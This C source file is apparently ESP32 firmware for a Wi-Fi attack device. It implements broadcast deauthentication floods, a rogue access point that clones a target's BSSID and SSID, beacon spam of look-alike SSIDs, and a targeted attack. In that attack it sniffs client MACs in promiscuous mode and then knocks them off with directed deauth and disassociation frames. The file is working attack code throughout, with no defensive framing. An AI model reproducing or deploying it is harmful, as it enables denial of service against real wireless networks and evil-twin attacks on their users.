/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 *
 * @brief Implements common methods for various attacks.
 * IMPORTANT: Does NOT re-initialise NVS / netif / event_loop / WiFi.
 * Those are already done by wifi_controller in this project.
 */

#include "attack_method.h"
#include "attack.h"
#include "attack_dos.h"
#include "esp_wifi.h"
#include "hydra_ssd1306_display.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <endian.h>

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "webserver.h"

static const char *TAG = "main:attack_method";

/* Number of deauth frames sent per burst (test intensity). Shared by the
 * broadcast and targeted methods; all targets use the same intensity. */
static uint8_t deauth_burst = 1;

void attack_method_set_intensity(uint8_t intensity) {
    if (intensity < 1)  intensity = 1;
    if (intensity > 10) intensity = 10;
    deauth_burst = intensity;
    ESP_LOGI(TAG, "Deauth intensity set to %u frame(s)/burst", deauth_burst);
}

static void timer_send_deauth_frame(void *arg) {
    wifi_ap_record_t *ap = (wifi_ap_record_t *) arg;

    esp_err_t ch_err = esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGV(TAG, "Channel set skip (AP mode active): %s", esp_err_to_name(ch_err));
        return;
    }

    for (uint8_t i = 0; i < deauth_burst; i++) {
        wsl_bypasser_send_deauth_frame(ap);
    }
}

static esp_timer_handle_t deauth_timer_handles[MAX_ATTACK_TARGETS];
static uint8_t active_timers = 0;

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
    esp_wifi_set_ps(WIFI_PS_NONE);
    if (active_timers >= MAX_ATTACK_TARGETS) {
        ESP_LOGW(TAG, "Max targets reached, skipping AP: %s", ap_record->ssid);
        return;
    }

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };

    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handles[active_timers]));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handles[active_timers], 100000));

    active_timers++;
    ESP_LOGD(TAG, "Timer started for BSSID: %02x:%02x...", ap_record->bssid[0], ap_record->bssid[1]);
}

void attack_method_broadcast_stop() {
    for (int i = 0; i < active_timers; i++) {
        ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handles[i]));
        esp_timer_delete(deauth_timer_handles[i]);
    }
    active_timers = 0;
    ESP_LOGI(TAG, "All deauth timers stopped.");
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    /* esp_wifi_set_mac() requires the AP interface to be disabled, or it
     * returns an error that ESP_ERROR_CHECK() turns into an abort() — i.e. the
     * whole chip reboots. wifictl_mgmt_ap_stop() drops APSTA to STA-only
     * (disabling the AP netif) so the MAC change is safe regardless of
     * whether the caller already did this. */
    wifictl_mgmt_ap_stop();
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

static const char *TAG_SC = "main:super_clone";
static bool sc_running = false;
static TaskHandle_t sc_task_handle = NULL;
static char target_ssid[33];
static uint8_t target_channel = 1;

#define MAX_CLONES 15
static uint8_t clone_mac_pool[MAX_CLONES][6];

static void generate_clone_mac_pool() {
    for (int i = 0; i < MAX_CLONES; i++) {
        for (int j = 0; j < 6; j++) {
            clone_mac_pool[i][j] = esp_random() & 0xFF;
        }
        clone_mac_pool[i][0] = (clone_mac_pool[i][0] & 0xFE) | 0x02;
    }
}

static void super_clone_task(void *pvParameters) {
    ESP_LOGI(TAG_SC, "Cloning target wifi...");
    oled_log(OLED_LINE1, 2, "Cloning %s", target_ssid);
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    while (sc_running) {
        for (int i = 0; i < MAX_CLONES; i++) {
            char fake_ssid[33];
            int base_len = strlen(target_ssid);

            if (base_len + i + 1 > 32) break;

            strncpy(fake_ssid, target_ssid, base_len);
            for (int s = 0; s < (i + 1); s++) {
                fake_ssid[base_len + s] = ' ';
            }
            fake_ssid[base_len + i + 1] = '\0';
            uint8_t ssid_len = strlen(fake_ssid);

            wsl_bypasser_send_beacon_frame(clone_mac_pool[i], (uint8_t *)fake_ssid, ssid_len, target_channel);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    sc_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_method_super_clone(const wifi_ap_record_t *ap_record) {
    if (sc_running) return;
    if (ap_record == NULL) return;

    strncpy(target_ssid, (char *)ap_record->ssid, 32);
    target_ssid[32] = '\0';
    target_channel = ap_record->primary;

    generate_clone_mac_pool();
    sc_running = true;
    xTaskCreate(super_clone_task, "super_clone", 4096, NULL, 5, &sc_task_handle);
}

void attack_method_super_clone_stop(void) {
    sc_running = false;
}

/* ───────────────────────── Targeted client deauth ───────────────────────── */

static const char *TAG_TGT = "main:targeted_deauth";

#define TGT_MAX_CLIENTS 64

/* Target AP records (pointers are stable — owned by wifi_controller scan list). */
static const wifi_ap_record_t *tgt_ap_recs[MAX_ATTACK_TARGETS];
static uint8_t tgt_ap_count = 0;

/* Distinct channels among the targets, for channel hopping. */
static uint8_t tgt_channels[MAX_ATTACK_TARGETS];
static uint8_t tgt_channel_count = 0;
static uint8_t tgt_chan_idx = 0;

/* Clients discovered via promiscuous sniffing, tagged with their AP's BSSID. */
typedef struct {
    uint8_t bssid[6];
    uint8_t mac[6];
} tgt_client_t;
static tgt_client_t tgt_clients[TGT_MAX_CLIENTS];
static volatile uint8_t tgt_client_count = 0;

static esp_timer_handle_t tgt_timer = NULL;
static volatile bool tgt_running = false;
static uint8_t tgt_intensity = 1;

static bool mac_is_unicast(const uint8_t *mac) {
    if (mac[0] & 0x01) return false;                       /* multicast/broadcast */
    uint8_t acc = 0;
    for (int i = 0; i < 6; i++) acc |= mac[i];
    return acc != 0;                                       /* not all-zero */
}

/* Adds a (bssid, client) pair if not already known. Called from the promiscuous
 * RX callback, so it must stay short and lock-free. */
static void tgt_add_client(const uint8_t *bssid, const uint8_t *client) {
    if (!mac_is_unicast(client)) return;
    for (int i = 0; i < tgt_client_count; i++) {
        if (memcmp(tgt_clients[i].mac, client, 6) == 0 &&
            memcmp(tgt_clients[i].bssid, bssid, 6) == 0) {
            return;                                        /* already tracked */
        }
    }
    if (tgt_client_count >= TGT_MAX_CLIENTS) return;
    uint8_t idx = tgt_client_count;
    memcpy(tgt_clients[idx].bssid, bssid, 6);
    memcpy(tgt_clients[idx].mac, client, 6);
    tgt_client_count = idx + 1;
    ESP_LOGI(TAG_TGT, "Client %02x:%02x:%02x:%02x:%02x:%02x on %02x:%02x:%02x:%02x:%02x:%02x",
             client[0], client[1], client[2], client[3], client[4], client[5],
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

/* Promiscuous RX callback: parses 802.11 data frames to learn which stations are
 * talking to one of our target BSSIDs. */
static void tgt_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *ppkt = (const wifi_promiscuous_pkt_t *) buf;
    if (ppkt->rx_ctrl.sig_len < 24) return;

    const uint8_t *p = ppkt->payload;
    if ((p[0] & 0x0C) != 0x08) return;                     /* type != data */

    bool to_ds   = p[1] & 0x01;
    bool from_ds = p[1] & 0x02;
    const uint8_t *addr1 = p + 4;                          /* receiver */
    const uint8_t *addr2 = p + 10;                         /* transmitter */

    const uint8_t *bssid, *client;
    if (to_ds && !from_ds) {          bssid = addr1; client = addr2; } /* STA -> AP */
    else if (!to_ds && from_ds) {     bssid = addr2; client = addr1; } /* AP -> STA */
    else return;                                           /* WDS / IBSS: skip */

    for (int i = 0; i < tgt_ap_count; i++) {
        if (memcmp(bssid, tgt_ap_recs[i]->bssid, 6) == 0) {
            tgt_add_client(tgt_ap_recs[i]->bssid, client);
            return;
        }
    }
}

/* Periodic sender: on each tick operate on one channel, blasting the targets that
 * live there — directed deauth+disassoc per known client, plus a broadcast deauth. */
static void tgt_tick(void *arg) {
    if (!tgt_running || tgt_channel_count == 0) return;

    uint8_t ch = tgt_channels[tgt_chan_idx];
    tgt_chan_idx = (tgt_chan_idx + 1) % tgt_channel_count;
    if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) return;

    for (int a = 0; a < tgt_ap_count; a++) {
        const wifi_ap_record_t *ap = tgt_ap_recs[a];
        if (ap->primary != ch) continue;

        for (uint8_t b = 0; b < tgt_intensity; b++) {
            wsl_bypasser_send_deauth_frame(ap);            /* broadcast fallback */
        }

        for (int c = 0; c < tgt_client_count; c++) {
            if (memcmp(tgt_clients[c].bssid, ap->bssid, 6) != 0) continue;
            for (uint8_t b = 0; b < tgt_intensity; b++) {
                wsl_bypasser_send_deauth_targeted(ap->bssid, tgt_clients[c].mac);
                wsl_bypasser_send_disassociation_frame(ap->bssid, tgt_clients[c].mac);
            }
        }
    }
}

void attack_method_targeted_start(const wifi_ap_record_t **records, uint8_t count, uint8_t intensity) {
    if (tgt_running) return;
    if (records == NULL || count == 0) return;

    tgt_ap_count = 0;
    tgt_channel_count = 0;
    tgt_chan_idx = 0;
    tgt_client_count = 0;

    if (intensity < 1)  intensity = 1;
    if (intensity > 10) intensity = 10;
    tgt_intensity = intensity;

    for (int i = 0; i < count && i < MAX_ATTACK_TARGETS; i++) {
        if (records[i] == NULL) continue;
        tgt_ap_recs[tgt_ap_count++] = records[i];

        uint8_t ch = records[i]->primary;
        bool known = false;
        for (int j = 0; j < tgt_channel_count; j++) {
            if (tgt_channels[j] == ch) { known = true; break; }
        }
        if (!known) tgt_channels[tgt_channel_count++] = ch;
    }
    if (tgt_ap_count == 0) return;

    esp_wifi_set_ps(WIFI_PS_NONE);

    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&tgt_rx_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(tgt_channels[0], WIFI_SECOND_CHAN_NONE);

    tgt_running = true;

    const esp_timer_create_args_t tgt_timer_args = {
        .callback = &tgt_tick,
        .name = "tgt_deauth"
    };
    ESP_ERROR_CHECK(esp_timer_create(&tgt_timer_args, &tgt_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(tgt_timer, 100000));   /* 100 ms */

    ESP_LOGI(TAG_TGT, "Targeted deauth started: %u AP(s), %u channel(s), intensity %u",
             tgt_ap_count, tgt_channel_count, tgt_intensity);
}

void attack_method_targeted_stop(void) {
    if (!tgt_running) return;
    tgt_running = false;

    if (tgt_timer) {
        esp_timer_stop(tgt_timer);
        esp_timer_delete(tgt_timer);
        tgt_timer = NULL;
    }
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG_TGT, "Targeted deauth stopped");
}
